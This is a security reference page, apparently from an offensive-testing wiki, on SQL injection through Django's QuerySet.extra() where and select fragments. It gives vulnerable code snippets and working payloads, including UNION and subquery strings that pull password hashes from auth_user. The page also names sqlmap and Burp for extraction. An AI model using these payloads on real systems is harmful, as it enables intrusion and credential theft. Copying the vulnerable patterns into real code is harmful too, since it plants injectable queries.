---
title: "Django extra() injection: select, where, and order_by clauses built from input"
description: QuerySet.extra() splices raw SQL fragments into select, where, tables, and order_by, when those fragments carry user input the result is SQL injection.
keywords:
  - Django ORM
  - extra() injection
  - select_extra
  - where_extra
  - order_by injection
  - SQL injection
---

# extra() injection

`QuerySet.extra()` is a legacy Django API that injects **raw SQL fragments** into specific parts of a query: `select=`, `where=`, `tables=`, `order_by=`, and `params=`. Each fragment is concatenated into the final statement, so any fragment built from untrusted input is a SQL injection sink. Django's own documentation warns that `extra()` is hard to use safely; in offensive review it is a reliable place to find injection.

## Vulnerable patterns

**`where` fragment**, the most direct sink:

```python
# q from the request
Entry.objects.extra(where=[f"headline LIKE '%{q}%'"])
```

**`select` fragment**, attacker controls a projected expression:

```python
Entry.objects.extra(select={"val": f"({user_expr})"})
```

**`order_by`**, accepts field or alias names, which Django resolves and quotes through the query compiler (a weaker sink than the raw fragments above):

```python
Entry.objects.extra(order_by=[request.GET["sort"]])
```

## Exploitation

**`where` injection** behaves like injection into a `WHERE` clause. Close the string/paren and add logic or a subquery:

```
%' OR '1'='1
%' UNION SELECT password FROM auth_user --
title',(SELECT password FROM auth_user LIMIT 1) AS stolen--
```

**`select` injection** lets you project an arbitrary scalar subquery into a column that the view then renders:

```
(SELECT password FROM auth_user WHERE is_superuser=true LIMIT 1)
```

**`order_by` is not a raw-SQL sink.** Unlike `select`/`where`, `extra(order_by=[...])` resolves each entry as a field or alias name and quotes it through the compiler, so an arbitrary expression such as a `CASE` payload raises a field-resolution error rather than executing. Treat it as at most a weak ordering oracle over existing columns; `QuerySet.order_by()` is validated the same way. For raw injection, target the `select` and `where` fragments, those splice your text into SQL directly, which is what makes `extra()` a high-value target.

## Tools

- **sqlmap**: automating extraction against the extra() select and where fragments.
- **Burp Repeater and Intruder**: delivering breakout and subquery payloads to the fragments.

## References

- [Django docs: extra()](https://docs.djangoproject.com/en/stable/ref/models/querysets/#extra)
- [PayloadsAllTheThings: SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
